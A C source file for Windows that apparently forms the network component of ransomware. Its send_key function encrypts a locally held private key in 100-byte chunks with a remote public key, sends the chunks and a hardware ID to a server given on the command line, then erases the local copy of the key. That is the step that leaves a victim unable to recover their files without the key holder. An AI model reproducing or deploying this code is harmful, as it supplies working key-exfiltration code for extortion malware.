#include "sock.h"
#include "crypt.h"

bool init_sock(WSADATA* wsa, SOCKET& sock, char** argv) {
	int res;
	struct sockaddr_in server;

	res = WSAStartup(MAKEWORD(2, 2), wsa);
	if (res != 0) {
		printf("WSAStartup failed with error: %d\n", res);
		return false;
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return false;
	}

	server.sin_addr.S_un.S_addr = inet_addr(argv[1]);
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[0]));

	// Connect to server.
	res = connect(sock, (struct sockaddr*) & server, sizeof(server));
	if (res == SOCKET_ERROR) {
		printf("%s:%s - connect failed with code: %d\n", argv[1], argv[0], WSAGetLastError());
		closesocket(sock);
		sock = INVALID_SOCKET;
		return false;
	}
	return true;
}

bool send_key(LPVOID pri_key_buff, DWORD crypt_size, LPVOID machine_key, DWORD machine_key_size, NCRYPT_KEY_HANDLE& skey, SOCKET sock) {
	NTSTATUS status;
	LPVOID send_buff = 0, tmp = 0;
	int sock_res;
	DWORD send_more = 0, ret = 0, pri_key_len = 0;

	tmp = HeapAlloc(GetProcessHeap(), 0, 100);
	if (tmp == NULL) {
		printf("tmp memory allocation failed.\n");
		return false;
	}
	pri_key_len = crypt_size;
	while (1) {
		//this loop is used, because we cannot encrypt a buffer more than 120 bytes (I chose 100 for simplicity). So we encrypt piece by piece and send it over 
		if (crypt_size == 0) break;
		//printf("\ncrypt_size: %lu\n", crypt_size);
		if (crypt_size > 100) {
			memcpy(tmp, (LPVOID)((DWORD)pri_key_buff + send_more * 100), 100);
			send_more++;
		}
		else {
			memset(tmp, 0, 100);
			memcpy(tmp, (LPVOID)((DWORD)pri_key_buff + send_more * 100), crypt_size);
			send_more = 0;
		}
		if (!NT_SUCCESS(status = NCryptEncrypt(skey, (PBYTE)tmp, 100 > crypt_size ? crypt_size : 100, NULL, 0, 0, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
			print_error("NCryptEncrypt1 failed", status);
			return false;
		}
		send_buff = HeapAlloc(GetProcessHeap(), 0, ret + strlen(CLIENT_KEY_DEF));
		if (send_buff == NULL) {
			printf("sendbuf memory allocation failed.n");
			return false;
		}
		memcpy(send_buff, CLIENT_KEY_DEF, strlen(CLIENT_KEY_DEF));
		if (!NT_SUCCESS(status = NCryptEncrypt(skey, (PBYTE)tmp, 100 > crypt_size ? crypt_size : 100, NULL, (PBYTE)((DWORD)send_buff + strlen(CLIENT_KEY_DEF)), ret, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
			print_error("NCryptEncrypt2 failed", status);
			return false;
		}
		// Send public key
		sock_res = send(sock, (const char*)send_buff, ret + strlen(CLIENT_KEY_DEF), 0);
		if (sock_res == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return false;
		}
		Sleep(500);
		if (send_buff) {
			HeapFree(GetProcessHeap(), 0, send_buff);
			send_buff = NULL;
		}
		crypt_size -= 100;
		if (send_more == 0) break;
	}
	memset(pri_key_buff, 0, pri_key_len);
	HeapFree(GetProcessHeap(), 0, pri_key_buff);
	//
	if (!NT_SUCCESS(status = NCryptEncrypt(skey, (PBYTE)machine_key, machine_key_size, NULL, 0, 0, &ret, NCRYPT_PAD_PKCS1_FLAG))) {
		print_error("NCryptEncrypt1 failed", status);
		return false;
	}
	send_buff = HeapAlloc(GetProcessHeap(), 0, ret + strlen(HARDWARE_ID_DEF));
	if (send_buff == NULL) {
		printf("sendbuf memory allocation failed.n");
		return false;
	}
	memcpy(send_buff, HARDWARE_ID_DEF, strlen(HARDWARE_ID_DEF));
	if (!NT_SUCCESS(status = NCryptEncrypt(skey, (PBYTE)machine_key, machine_key_size, NULL, (PBYTE)((DWORD)send_buff + strlen(HARDWARE_ID_DEF)), ret, &ret, NCRYPT_PAD_PKCS1_FLAG))) {
		print_error("NCryptEncrypt2 failed", status);
		return false;
	}
	sock_res = send(sock, (const char*)send_buff, ret + strlen(HARDWARE_ID_DEF), 0);
	if (sock_res == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return false;
	}
	sock_res = send(sock, "done", 5, 0);
	if (sock_res == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return false;
	}
	HeapFree(GetProcessHeap(), 0, send_buff);
	HeapFree(GetProcessHeap(), 0, tmp);
	return true;
}